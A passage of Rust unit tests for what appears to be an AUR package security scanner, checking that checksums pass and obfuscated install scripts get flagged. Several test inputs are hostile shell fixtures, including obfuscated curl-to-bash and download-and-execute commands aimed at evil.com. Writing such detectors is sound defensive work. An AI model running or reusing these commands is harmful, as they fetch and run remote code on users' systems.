        let ids = analyze(&format!("sha512sums=('{sha512}')"));
        assert!(
            !has(&ids, "SA-DATA-BLOB-HEX"),
            "SHA-512 checksum should not trigger"
        );
    }

    #[test]
    fn data_blob_sha512_multiline_not_flagged() {
        let sha512 = "a1".repeat(64);
        let content = format!("sha512sums=('{sha512}'\n            '{sha512}')");
        let ids = analyze(&content);
        assert!(
            !has(&ids, "SA-DATA-BLOB-HEX"),
            "SHA-512 in multi-line array should not trigger"
        );
    }

    // --- Install script analysis ---

    fn analyze_install(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: Some(content.into()),
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
        };
        ShellAnalysis
            .analyze(&ctx)
            .iter()
            .map(|s| s.id.clone())
            .collect()
    }

    #[test]
    fn install_var_concat_curl_pipe_bash() {
        let ids = analyze_install("a=cu\nb=rl\n$a$b http://evil.com | bash");
        assert!(has(&ids, "IS-SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn install_indirect_exec() {
        let ids = analyze_install("x=bash\necho id | $x");
        assert!(has(&ids, "IS-SA-INDIRECT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn install_charbychar() {
        let ids = analyze_install(
            r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com",
        );
        assert!(has(&ids, "IS-SA-CHARBYCHAR-CONSTRUCT"), "got: {ids:?}");
    }

    #[test]
    fn install_data_blob_hex() {
        let hex = "a1".repeat(80);
        let ids = analyze_install(&format!("data=\"{hex}\""));
        assert!(has(&ids, "IS-SA-DATA-BLOB-HEX"), "got: {ids:?}");
    }

    #[test]
    fn install_binary_download() {
        let ids = analyze_install(
            "curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool",
        );
        assert!(has(&ids, "IS-SA-BINARY-DOWNLOAD-NOCOMPILE"), "got: {ids:?}");
    }

    #[test]
    fn install_benign_no_signals() {
        let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
        assert!(
            ids.is_empty(),
            "benign install script should trigger no signals, got: {ids:?}"
        );
    }
}
